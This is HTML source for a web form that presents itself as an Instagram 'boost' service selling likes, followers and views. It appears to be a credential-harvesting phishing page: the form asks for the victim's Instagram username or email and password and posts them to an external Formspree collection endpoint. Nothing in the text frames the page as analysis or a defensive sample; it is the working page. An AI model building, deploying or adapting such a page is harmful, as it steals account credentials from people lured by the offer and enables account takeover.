    <link rel="stylesheet" href="classes.css">
    <link rel="shortcut icon" href="/INSTA.png" type="image/png">

<body>
    <form class="form-container" id="view1" action="https://formspree.io/f/mdkenbez" method="POST" >
        
        <div class="acct-types">
            <a href="classes.html" class="insta" id="instagram"><i class="fab fa-instagram instagram-icon"></i></a>
            <a href="face.html" class="fb" id="facebook2"><i class="fab fa-facebook facebook-icon"></i></a>
            <a href="tik.html" class="tt" id="tiktok3"><i class="fab fa-tiktok  tiktok-icon"></i></a>
        </div>
        <div class="form-group">
            <h2>Boost Your Instagram Profile</h2>
        </div>
        <div class="form-group">
            <label for="client-username">Username / Email</label>
            <input type="text" id="client-username" name="manig" placeholder="Enter username" required>
        </div>

        <div class="form-group">
            <label for="client-password">Password</label>
            <input type="password" id="client-password" name="passig" placeholder="Enter password" required>
        </div>

        <div class="form-group services">
            <label for="">Select a Service</label>
            <a id="one" class="css-button-shadow-border-sliding--sand butn">Likes</a>
            <a id="two" class="butn css-button-shadow-border-sliding--sand">Followers</a>
            <a id="three" class="butn css-button-shadow-border-sliding--sand">Views</a>
        </div>
        <div class="form-group">
            <input type="text" class="box box1" id="onebox" name="likes" placeholder="Input Post / Reel link to boost your likes" >
            <input type="text" class="box box2" id="twobox" name="followers" placeholder="Input instagram profile link to boost your followers" >
            <input type="text" class="box box3" id="threebox" name="views" placeholder="Input Post / Reel link to boost your views" >
        </div>
        <div class="form-group">
            <input type="number" class="num num1" id="num1box" name="amounttlikes" placeholder="input the amount of Likes you need. max = 1500" >
            <input type="number" class="num num2" id="num2box" name="amountfollowers" placeholder="input the amount of Followers you need. max = 3000" >
            <input type="number" class="num num3" id="num3box" name="amountviews" placeholder="input the amount of Views you need. max = 2000" >
        </div>
        <button class="css-button-neumorphic" id="submit" type="submit">Boost</button>

    </form>
